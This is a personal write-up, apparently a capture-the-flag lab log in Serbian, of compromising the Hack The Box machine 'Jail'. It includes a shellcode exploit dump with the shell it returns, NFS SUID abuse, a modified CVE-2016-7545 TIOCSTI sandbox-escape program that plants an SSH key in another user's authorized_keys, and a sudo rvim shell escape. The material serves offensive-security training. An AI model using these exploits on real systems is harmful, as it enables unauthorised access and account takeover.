+
+
+#### verzija expploit.py koji smo probali na Centos-u (sa debugom)
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ python exploit.py 
+[+] Opening connection to 10.10.10.34 on port 7411: Done
+[DEBUG] Received 0x1d bytes:
+    'OK Ready. Send USER command.\n'
+[DEBUG] Sent 0x6 bytes:
+    'DEBUG\n'
+[DEBUG] Received 0x12 bytes:
+    'OK DEBUG mode on.\n'
+[DEBUG] Sent 0xb bytes:
+    'USER admin\n'
+[DEBUG] Received 0x16 bytes:
+    'OK Send PASS command.\n'
+[DEBUG] Sent 0x6e bytes:
+    00000000  50 41 53 53  20 cc cc cc  cc cc cc cc  cc cc cc cc  │PASS│ ···│····│····│
+    00000010  cc cc cc cc  cc cc cc cc  cc cc cc cc  cc cc cc cc  │····│····│····│····│
+    00000020  cc 30 d6 ff  ff 68 0a 0a  0e 1b 5e 66  68 d9 03 5f  │·0··│·h··│··^f│h··_│
+    00000030  6a 66 58 99  6a 01 5b 52  53 6a 02 89  e1 cd 80 93  │jfX·│j·[R│Sj··│····│
+    00000040  59 b0 3f cd  80 49 79 f9  b0 66 56 66  57 66 6a 02  │Y·?·│·Iy·│·fVf│Wfj·│
+    00000050  89 e1 6a 10  51 53 89 e1  cd 80 b0 0b  52 68 2f 2f  │··j·│QS··│····│Rh//│
+    00000060  73 68 68 2f  62 69 6e 89  e3 52 53 eb  ce 0a        │shh/│bin·│·RS·│··│
+    0000006e
+[*] Closed connection to 10.10.10.34 port 7411    <- puca
+
+
+#### nakon startovanja nove verzije exploit.py, sa socket reuse-om
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ python exploit.py 
+[+] Opening connection to 10.10.10.34 on port 7411: Done
+[*] Switching to interactive mode
+
+Debug: userpass buffer @ 0xffffd610
+$ ls                                    <- imamo shell
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ whoami
+nobody
+$ id
+uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
+
+####
+The nobody user is a pseudo user in many Unixes and Linux distributions. According to the Linux Standard Base, the nobody user and its group are an optional mnemonic user and group. That user is meant to represent the user with the least permissions on the system. In the best case that user and its group are not assigned to any file or directory (as owner). This user is in his corresponding group that is (according to LSB) also called "nobody" and in no other group.
+
+The nobody user should have no shell assigned to it. Different distributions handle that in different ways: some refer to /sbin/nologin that prints a message; some refer to /bin/false that simply exits with 1 (false); or some just disable the user in /etc/shadow.
+
+According to Linux Standard Base, the nobody user is "Used by NFS". In fact the NFS daemon is one of the few that still needs the nobody user. If the owner of a file or directory in a mounted NFS share doesn't exist at the local system, it is replaced by the nobody user and its group.
+
+You can change the permission of a file owned by the nobody user just simply with the root user and chown. But at the machine hosting the NFS share, that user might exist, so take care.
+
+
+$ cat /etc/passwd
+nobody:x:99:99:Nobody:/:/sbin/nologin         <- nema shell-a
+# mozda ce biti interesantno
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+
+#### kako da dobijemo root
+CVE-2016-7545 -- SELinux sandbox escape
+https://seclists.org/oss-sec/2016/q3/606
+
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+    char *cmd = "id\n";
+    while(*cmd)
+     ioctl(0, TIOCSTI, cmd++);
+    execlp("/bin/id", "id", NULL);
+}
+
+
+#### pre nego sto anstavimo dalje sada pokusavamo da utvrdimo sta je moguce uraditi sa nfs mountom (nasli smo ga preko nmap-a)
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo apt install -y nfs-common
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ showmount --help
+Usage: showmount [-adehv]
+       [--all] [--directories] [--exports]
+       [--no-headers] [--help] [--version] [host]
+
+-a or --all
+List both the client hostname or IP address and mounted directory in host:dir format. This info should not be considered reliable. See the notes on rmtab in rpc.mountd(8).
+-d or --directories
+List only the directories mounted by some client.
+-e or --exports
+Show the NFS server's export list.
+-h or --help
+Provide a short help summary.
+-v or --version
+Report the current version number of the program.
+--no-headers
+Suppress the descriptive headings from the output.
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ showmount --exports 10.10.10.34
+Export list for 10.10.10.34:
+/opt          *
+/var/nfsshare *
+
+#### sometimes the home directory can be mounted as an NFS share which would allow us to upload SSH keys
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ showmount --all 10.10.10.34
+All mount points on 10.10.10.34:
+
+
+#### jos jedan utility
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ rpcinfo -p 10.10.10.34
+   program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  53992  status
+    100005    1   udp  20048  mountd
+    100024    1   tcp  52726  status
+    100005    1   tcp  20048  mountd
+    100005    2   udp  20048  mountd
+    100005    2   tcp  20048  mountd
+    100005    3   udp  20048  mountd
+    100005    3   tcp  20048  mountd
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    3   tcp   2049
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100227    3   udp   2049
+    100021    1   udp  49501  nlockmgr
+    100021    3   udp  49501  nlockmgr
+    100021    4   udp  49501  nlockmgr
+    100021    1   tcp  33060  nlockmgr
+    100021    3   tcp  33060  nlockmgr
+    100021    4   tcp  33060  nlockmgr
+
+
+
+#### cini mi se da je matori alat
+https://github.com/NetDirect/nfsshell
+
+#### isto matoro
+NfSpy - an ID-spoofing NFS client
+https://github.com/bonsaiviking/NfSpy
+
+
+
+#### dobiti iste informacije preko metasploit-a
+kangus7@kali:~$ sudo msfdb init
+[i] Database already started
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+
+
+kangus7@kali:~$ sudo msfconsole
+msf5 > use  scanner/nfs/nfsmount
+msf5 auxiliary(scanner/nfs/nfsmount) > show actions
+
+Auxiliary actions:
+
+   Name  Description
+   ----  -----------
+
+
+msf5 auxiliary(scanner/nfs/nfsmount) > show options
+
+Module options (auxiliary/scanner/nfs/nfsmount):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     111              yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads
+
+
+msf5 auxiliary(scanner/nfs/nfsmount) > set RHOSTS 10.10.10.34
+RHOSTS => 10.10.10.34
+
+
+msf5 auxiliary(scanner/nfs/nfsmount) > run
+
+[+] 10.10.10.34:111       - 10.10.10.34 NFS Export: /opt [*]
+[+] 10.10.10.34:111       - 10.10.10.34 NFS Export: /var/nfsshare [*]
+[*] 10.10.10.34:111       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+#### dalje nastavljamo preko standardnih alata
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ mkdir --help
+Usage: mkdir [OPTION]... DIRECTORY...
+Create the DIRECTORY(ies), if they do not already exist.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -m, --mode=MODE   set file mode (as in chmod), not a=rwx - umask
+  -p, --parents     no error if existing, make parent directories as needed
+  -v, --verbose     print a message for each created directory
+  -Z                   set SELinux security context of each created directory
+                         to the default type
+      --context[=CTX]  like -Z, or if CTX is specified then set the SELinux
+                         or SMACK security context to CTX
+      --help     display this help and exit
+      --version  output version information and exit
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo mkdir --parents /mnt/jail/{opt,nfsshare}
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ showmount -e 10.10.10.34
+Export list for 10.10.10.34:
+/opt          *
+/var/nfsshare *
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo mount --types nfs --options vers=3 10.10.10.34:/opt /mnt/jail/opt
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo mount --types nfs --options vers=3 10.10.10.34:/var/nfsshare /mnt/jail/nfsshare
+
+
+# da vidimo kojim fajlovima imamo pristupa
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ cd /mnt/jail/
+kangus7@kali:/mnt/jail$ find . -type f
+./opt/logreader/logreader.sh            <- ovo bi trebalo da je   
+                                            permission denied
+find: ‘./nfsshare’: Permission denied
+
+
+kangus7@kali:/mnt/jail$ ls -lah
+total 8.0K
+drwxr-xr-x 4 root root    4.0K Jul  6 01:07 .
+drwxr-xr-x 3 root root    4.0K Jul  6 01:07 ..
+drwx-wx--x 2 root kangus7    6 Jul  4  2017 nfsshare      <- ovo bi 
+                                                          takodje trebalo da je root
+drwxr-xr-x 4 root root      33 Jun 26  2017 opt
+
+####kao da je masina promenjena u medjuvremenu
+
+#provereavamo da li imamo pristupa nekim fajlovima
+kangus7@kali:/mnt/jail$ find . -type f
+./opt/logreader/logreader.sh            <- za razliku od videa, ovom
+                                          fajlu imamo pristup
+find: ‘./nfsshare’: Permission denied
+
+# kao user frank, imamo pravo cat-ovanja checkproc.log fajla
+kangus7@kali:/mnt/jail/opt/logreader$ cat logreader.sh 
+#!/bin/bash
+/bin/cat /home/frank/logs/checkproc.log
+
+
+##### ls output objasnjen
+In the order of output;
+
+-rwxrw-r--    1    root   root 2048    Jan 13 07:11 afile.exe
+
+file permissions,
+number of links,
+owner name,
+owner group,
+file size,
+time of last modification, and
+file/directory name
+File permissions is displayed as following;
+
+first character is - or l or d, d indicates a directory, a line represents a file, l is a symlink (or soft link) - special type of file
+three sets of characters, three times, indicating permissions for owner, group and other:
+r = readable
+w = writable
+x = executable
+In your example -rwxrw-r--, this means the line displayed is:
+
+a regular file (displayed as -)
+readable, writable and executable by owner (rwx)
+readable, writable, but not executable by group (rw-)
+readable but not writable or executable by other (r--)
+
+#u videu nfsshare ima goup uid 1000
+kangus7@kali:/mnt/jail$ ls -lah
+total 8.0K
+drwxr-xr-x 4 root root    4.0K Jul  6 01:07 .
+drwxr-xr-x 3 root root    4.0K Jul  6 01:07 ..
+drwx-wx--x 2 root kangus7    6 Jul  4  2017 nfsshare      <- ovo bi 
+                                                          takodje trebalo da je root
+drwxr-xr-x 4 root root      33 Jun 26  2017 opt
+
+#kod mene kangus7 korisnik ima uid 1000, te tako mogu da upisujem u nfsshare bez izmena u /etc/passwd (kao u videu)
+
+kangus7:x:1000:1000:kangus7,,,:/home/kangus7:/bin/bash
+
+kangus7@kali:/mnt/jail$ cd nfsshare/
+kangus7@kali:/mnt/jail/nfsshare$ ls
+ls: cannot open directory '.': Permission denied
+kangus7@kali:/mnt/jail/nfsshare$ touch test       <- fajl kreiran
+
+#### informacije o nfs-u
+There are three main configuration files you will need to edit to set up an NFS server: 
+# This file contains a list of entries; each entry indicates a volume 
+# that is shared and how it is shared.
+/etc/exports, 
+/etc/hosts.allow, 
+and /etc/hosts.deny
+
+#na Jail masini
+$ cat /etc/exports
+/var/nfsshare *(rw,sync,root_squash,no_all_squash)
+/opt *(rw,sync,root_squash,no_all_squash)
+
+the option listing for each machine will describe what kind of access that machine will have. 
+Important options are:
+
+ro: 
+The directory is shared read only; the client machine will not be able to write it. This is the default.
+rw: 
+The client machine will have read and write access to the directory.
+no_root_squash: 
+By default, any file request made by user root on the client machine is treated as if it is made by user nobody on the server. (Exactly which UID the request is mapped to depends on the UID of user "nobody" on the server, not the client.) If no_root_squash is selected, then root on the client machine will have the same level of access to the files on the system as root on the server. This can have serious security implications, although it may be necessary if you want to perform any administrative work on the client machine that involves the exported directories. You should not specify this option without a good reason.
+no_subtree_check: 
+If only part of a volume is exported, a routine called subtree checking verifies that a file that is requested from the client is in the appropriate part of the volume. If the entire volume is exported, disabling this check will speed up transfers.
+sync: By default, all but the most recent version (version 1.11) of the exportfs command will use async behavior, telling a client machine that a file write is complete - that is, has been written to stable storage - when NFS has finished handing the write over to the filesystem. This behavior may cause data corruption if the server reboots, and the sync option prevents this. 
+all_squash:
+Map all uids and gids to the anonymous user. Useful for NFS-exported public FTP directories, news spool directories, etc. The opposite option is no_all_squash, which is the default setting.
+
+
+$ ls -la /var/nfsshare/test
+-rw-r--r--. 1 frank frank 0 Jul  6 11:54 /var/nfsshare/test
+
+# Chmod 4755 (chmod a+rwx,g-w,o-w,ug+s,+t,g-s,-t) sets permissions so that, (U)ser / owner can read, can write and can execute. (G)roup can read, can't write and can execute. (O)thers can read, can't write and can execute.
+
+http://www.filepermissions.com/articles/sticky-bit-suid-and-sgid
+It's already been established in a previous article that you can use 3 digits to represent any file permission value, or manage them using chmod. However, you can in fact use 4 digits to achieve the same result where, for example 777 is equal to 0777, and so on. This additional prepended octal value, represents some special features known as Sticky Bit's, UID's, and GID's. 
+
+However as stated above, when using this additional octal, the values (still ranging from 0-7) represent the following options:
+
+Special options octal breakdown cheat sheet
+0 - No options set 
+1 - Sticky Bit set 
+2 - SGID set 
+3 - Sticky Bit and SGID Set 
+4 - SUID set 
+5 - Sticky Bit and SUID Set 
+6 - SGID and SUID set 
+7 - Sticky Bit GID and UID Set
+
+
+A Sticky Bit, is a special setting within file permissions that helps limit access beyond what normal file permissions are capable of. In short, a Sticky Bit ensures only the owner of the file / directory is able to delete or rename the file. However it should be noted that root is able to edit and delete the file as well.
+
+There are certain cases where a user needs to execute or manipulate a file or program where elevated privileges are required. In which case a SUID or SGID can be set in order to provide the required permissions for execution. A SETUID or SETGID binary is executed respectively whilst the command is executed on the document in question. Usually an SUID or SGID is required where users need elevated privileges and do not have admin or root access.   <- fajl radi pod root pravima
+
+
+kangus7@kali:/mnt/jail/nfsshare$ chmod 4755 test
+
+$ ls -la /var/nfsshare/test
+-rwsr-xr-x. 1 frank frank 0 Jul  6 11:54 /var/nfsshare/test
+
+# kreirao fileperm.c fajl na nfs share na Jail masini
+kangus7@kali:/mnt/jail/nfsshare$ vim fileperm.c
+
+$ ls -la /var/nfsshare/fileperm.c
+-rw-r--r--. 1 frank frank 405 Jul  6 12:23 /var/nfsshare/fileperm.c
+
+# ne mozemo da kompajliramo lokalno jer smo nobody user
+# mogu da kompajliram na lokalnoj masini i onda odradim upload
+$ gcc /var/nfsshare/fileperm.c -o /var/nfsshare/fileperm
+gcc: error trying to exec 'cc1': execvp: No such file or directory
+$ id
+uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
+
+kangus7@kali:/mnt/jail/nfsshare$ gcc fileperm.c -o fileperm
+fileperm.c: In function ‘main’:
+fileperm.c:4:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+  setuid(1000);
+  ^~~~~~
+fileperm.c:6:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+  setgid(1000);
+  ^~~~~~
+fileperm.c:13:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+  system("/usr/bin/id");
+  ^~~~~~
+kangus7@kali:/mnt/jail/nfsshare$ chmod 4755 fileperm
+
+# nista se nije dogodilo
+$ /var/nfsshare/fileperm
+uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
+$ ls -la /var/nfsshare/fileperm
+-rwsr-xr-x. 1 frank frank 16712 Jul  6 12:32 /var/nfsshare/fileperm
+
+# proveravam da li je mozda nosuid postavljen na /var folder - nije
+# znaci da nas SELinux sprecava
+
+$ mount | grep nosuid
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime,seclabel)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+devtmpfs on /dev type devtmpfs (rw,nosuid,seclabel,size=485416k,nr_inodes=121354,mode=755)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,seclabel)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,nodev,seclabel,mode=755)
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,seclabel,mode=755)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+tmpfs on /run/user/0 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=99992k,mode=700)
+
+
+#### kako da dobijemo root
+CVE-2016-7545 -- SELinux sandbox escape
+https://seclists.org/oss-sec/2016/q3/606
+
+# ovo je sebypass.c fajl
+# dropkey.c sa izmenama
+
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+    char *cmd = "id\n";
+    while(*cmd)
+     ioctl(0, TIOCSTI, cmd++);
+
+    // sada menjamo exploit, tako sto cemo kopirati SSH kljuc za SSH sesiju kao frank korisnk
+
+    /*
+    The exec() family of functions replaces the current process image with a new process image. 
+    The initial argument for these functions is the name of a file that is to be executed.
+    */
+    //execlp("/bin/id", "id", NULL);    <- "/bin/id" kao da pravi probleme kao komentar
+    //.kangus7.key samo da ucinimo fajl tezim da ga spaze
+    // sto NULL na kraju
+    execlp("/bin/cp", "cp", "/var/nfsshare/.kangus7.key", "/home/frank/.shh/authorized_keys", NULL);
+}
+
+
+kangus7@kali:/mnt/jail/nfsshare$ gcc sebypass.c -o sebypass
+kangus7@kali:/mnt/jail/nfsshare$ chmod 4755 sebypass
+
+$ /var/nfsshare/sebypass
+uid=99(nobody) gid=99(nobody) euid=1000(frank)      <- drugi euid, frank korisnik
+groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
+
+
+#### kreirao kljuc
+kangus7@kali:~/Desktop$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kangus7/.ssh/id_rsa): /home/kangus7/Desktop/dropkey
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kangus7/Desktop/dropkey.
+Your public key has been saved in /home/kangus7/Desktop/dropkey.pub.
+The key fingerprint is:
+SHA256:kOt5EieD3+LfpbBZD9QNswn9HtAElLxvA0cb87jmAbQ kangus7@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|           ooo.  |
+|       .   .+o+  |
+|      o   ..=+.* |
+|     . o   oEO+ .|
+|    . = S . +=+. |
+|     o B .   .B. |
+|      * + o .+.o |
+|     . + * =  .  |
+|      ..+ o .    |
++----[SHA256]-----+
+
+
+kangus7@kali:~/Desktop$ cat dropkey.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDihWAQysbv1MNXXiY8FinYaRpoMh/aP9qZxUTpj7BcwF1kuMEsaHDi4dP312mmWdDZMNx3AXIBqT+uZVcpfDTMJ7sPvVDHK3G2ehc3M67mv5bMAIMBv9Y0zyXMd7FG6s6lw482XlM/H40FaEb6Rb3ZxWyVnRShuRbPKv65aB/TW0/AmqhDK2ZJGS9WIxDQOo0kKj4mQ8sULlkMqkqnO923k5IwH5T4dQzpKdYn2uGE8DCxvp18LF6U9a56r3ZQM2SsgWXNaTPlELpwj2vsod57sAXypZkw4KBXsFDBCHbXFkir7aSW7Qd7jGzTbk26fGnrI0OXgo2db7hWQvSzgspR kangus7@kali
+
+kangus7@kali:/mnt/jail/nfsshare$ vim .kangus7.key
+
+# kompajlirao fajl sa izmenama
+kangus7@kali:/mnt/jail/nfsshare$ gcc dropkey.c -o dropkey
+kangus7@kali:/mnt/jail/nfsshare$ chmod 4755 dropkey
+
+
+# ne postoji authorized_keys file u .ssh folderu
+$ /var/nfsshare/dropkey
+cp: cannot create regular file '/home/frank/.shh/authorized_keys': No such file or directory
+
+ovo ce kopirati moj kljuc preko svih postojecih kljuceva u authorized_keys (samo moj kljuce ce ostati)
+ako postoji mogucnost append-a
+
+#jebo me vim
+# kopiranje iz vim-a u externi program
+# u Visual modu, selektovati tekst
+# "+y da kopira
+# Ctrl+v u exkternom programu
+
+
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+    char *cmd = "id\n";
+    while(*cmd)
+     ioctl(0, TIOCSTI, cmd++);
+    //vec je postojao folder /home/frank/.shh
+    //execlp("/bin/mkdir", "mkdir", "/home/frank/.ssh", NULL);
+    //kreira authorized_keys fajl u .ssh folderu
+    //execlp("/bin/touch", "touch", "/home/frank/.ssh/authorized_keys", NULL);
+    //kopira kljuc
+   execlp("/bin/cp", "cp", "/var/nfsshare/.kangus7.key", "/home/frank/.ssh/authorized_keys", NULL);
+}
+
+
+#evo me kao frenk
+kangus7@kali:~/Desktop$ ssh -i dropkey frank@10.10.10.34
+[frank@localhost ~]$ ls
+bin  Desktop  Documents  Downloads  logs  Music  Pictures  Public  Templates  user.txt  Videos
+[frank@localhost ~]$ id
+uid=1000(frank) gid=1000(frank) groups=1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[frank@localhost ~]$ cat user.txt 
+9864400728f309c1238f622927883017
+
+
+Introducing LinEnum – Scripted Local Linux Enumeration & Privilege Escalation Checks 
+#nije koriscen na ovoj masini
+https://www.rebootuser.com/?p=1758
+https://github.com/rebootuser/LinEnum
+
+linuxprivchecker.py -- a Linux Privilege Escalation Check Script
+https://github.com/sleventyeleven/linuxprivchecker
+
+
+man sudo
+-l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking        user (or the user specified by the -U option) on the current host.  A longer list for‐
+            mat is used if this option is specified multiple times and the security policy supports a verbose output format.
+
+            If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.  If a command
+            is specified but not allowed by the policy, sudo will exit with a status value of 1.
+
+
+ -u user, --user=user   
+        Run the command as a user other than the default target user (usually root).  The user may be either a user name or a numeric user ID (UID) prefixed with the ‘#’ character
+                 (e.g., #0 for UID 0).  When running commands as a UID, many shells require that the ‘#’ be escaped with a backslash (‘\’).  Some security policies may restrict UIDs to those
+                 listed in the password database.  The sudoers policy allows UIDs that are not in the password database as long as the targetpw option is not set.  Other security policies
+                 may not support this.
+
+
+
+#da uklonim za sobom kada zezenm stvar
+
+In UNIX and Linux, the ability to remove a file is not determined by the access bits of that file. It is determined by the access bits of the directory which contains the file.
+
+Think of it this way -- deleting a file doesn't modify that file. You aren't writing to the file, so why should "w" on the file matter? Deleting a file requires editing the directory that points to the file, so you need "w" on the that directory.
+
+[frank@localhost ~]$ chmod 777 -R export
+
+# prebacio fajl na jail masinu
+kangus7@kali:~/Desktop$ scp -i dropkey /home/kangus7/Downloads/LinEnum-master/LinEnum.sh   frank@10.10.10.34:/home/frank/LinEnum.sh
+LinEnum.sh                                                                                                                                                       100%   45KB 390.9KB/s   00:00    
+
+# pokrenuo fajl
+[frank@localhost ~]$ ./LinEnum.sh -e /tmp/export -r linenum.txt
+
+# kopirao rezultat
+# ostavlja dosta fajlova za sobom
+
+kangus7@kali:~/Desktop$ scp -i dropkey frank@10.10.10.34:/home/frank/linenum.txt-06-07-19 /home/kangus7
+linenum.txt-06-07-19                                                                                                                                             100%   84KB 830.9KB/s   00:00    
+
+# za linuxprivchecker
+# https://github.com/reider-roque/linpostexp
+
+
+[frank@localhost ~]$ python linuxprivchecker.py > linuxprivchecker.txt
+
+kangus7@kali:~/Desktop$ scp -i dropkey frank@10.10.10.34:/home/frank/linuxprivchecker.py /home/kangus7
+linuxprivchecker.py   
+
+
+#### ukljuceno u rezultate gore (oba alata)
+[frank@localhost ~]$ sudo -l
+Matching Defaults entries for frank on this host:
+    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User frank may run the following commands on this host:
+    # ovaj unos je gubljenje vremena
+    (frank) NOPASSWD: /opt/logreader/logreader.sh
+    
+    # mogu da pokrenem rvim kao admin, a da zatim pokrenem shell pod root nalogom iz rvim-a
+    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+
+#sartuemo rvim kao adm
+[frank@localhost ~]$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+
+
+#### unutar programa
+python -c 'import pty;pty.spawn("/bin/bash")'
+#pyton -c               <- startuj komandu
+#import pty             <- importuje pty modul
+#pty.spawn              <- Spawn a process, and connect its controlling terminal with the current process’s standard io. 
+                    This is often used to baffle programs which insist on reading from the controlling terminal.  
+#pty.spawn("/bin/bash")'      <- startuje terminal
+
+
+python command line 
+https://docs.python.org/3/using/cmdline.html
+https://docs.python.org/2/using/cmdline.html
+
+
+pty — Pseudo-terminal utilities
+https://docs.python.org/3.2/library/pty.html
+
+
+:python import pty;ptyspawn("/bin/bash")  <- imamo shell kao root
+bash-4.2$ whoami
+adm
+bash-4.2$ id
+uid=3(adm) gid=4(adm) groups=4(adm) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+bash-4.2$ 
+
+bash-4.2$ find . -type f
+./.keys/note.txt
+./.keys/.local/.frank
+./.keys/keys.rar
+
+#format password-a za frank-a
+bash-4.2$ cat note.txt
+Note from Administrator:
+Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
+
+
+bash-4.2$ cd .local
+bash-4.2$ ls
+bash-4.2$ ls -lah
+total 4.0K
+drwxr-x---. 2 root adm  20 Jul  3  2017 .
+drwxr-x---. 3 root adm  52 Jul  3  2017 ..
+-rw-r-----. 1 root adm 113 Jul  3  2017 .frank
+#ROT-13 cipher ili nesto slicno
+bash-4.2$ cat .frank
+Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
+
+#enkriptovan rar
+bash-4.2$ unrar x keys.rar 
+
+UNRAR 5.00 freeware      Copyright (c) 1993-2013 Alexander Roshal
+
+
+Extracting from keys.rar
+
+Enter password (will not be echoed) for rootauthorizedsshkey.pub: 
+
+
+#### prover-a ciphertexta
+http://rumkin.com/tools/cipher/
+http://fbcs.bplaced.net/multi_encoder_decoder.html
+https://quipqiup.com/
+
+#resenje
+Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
+
+Frank Lee Morris < -Alcatraz escapee (nadjes na Internetu)
+
+
+#### konvertujemo keys.rar u base64 format
+mogli smo ga samo kopirati preko scp-a, ali ovo je nesto novije
+In computer science Base64 is a group of binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding. Each Base64 digit represents exactly 6 bits of data. 
+
+bash-4.2$ base64 keys.rar 
+UmFyIRoHAM+QcwAADQAAAAAAAAALnXQkhEAAgAEAAMMBAAAD7rRLW0tk40odMxgApIEAAHJvb3Rh
+dXRob3JpemVkc3Noa2V5LnB1YnI+qg+QiYZnpO86O3+rX46ki9CMd7+qCC09p9xDL5gF8Wgwc7mZ
+K9wkiTpvXO4vmmM50barFVJi55jD3l9J8var5iMCb8+Lrpn2e79rXFKzktBJ2e3/cSLUZRSv33cQ
+Fk2+9b43PDDjUD6IQ6FVbjc72sy6/8bMu7k8MYtJWFRHsLTwIXi0ZMrd/vydVFq7vQiUPYbt7H0S
+scXY4crEf9ann9iQyl6V034tluMZ9VQ6DmkXk53ekSbb3/Ck5/1hb9qj2RpBQUNTW70fQIbDXjcO
+p+qKerl8cfpDdo7JDRZbmJBuYd5zgFEASKHrew3spqQ/gZrNO6m/VvI/ZUa6DTmqhguHYKC838c9
+JzzDmW52daeuPMZtdTz2B0Enz5eBdV2XLbofx6ZA3nIYco6DJMvU9NxOfaLgnTj/JWRVAgUjoEgQ
+UdcyWDEWoDYh+ARbAfG+qyqRhF8ujgUqYWNbXY8FxMsrTPdcWGz8348OZsMWH9NS5S8/KeIoGZU1
+YhfpP/6so4ihWCnWxD17AEAHAA==
+
+
+#odradio konverziju
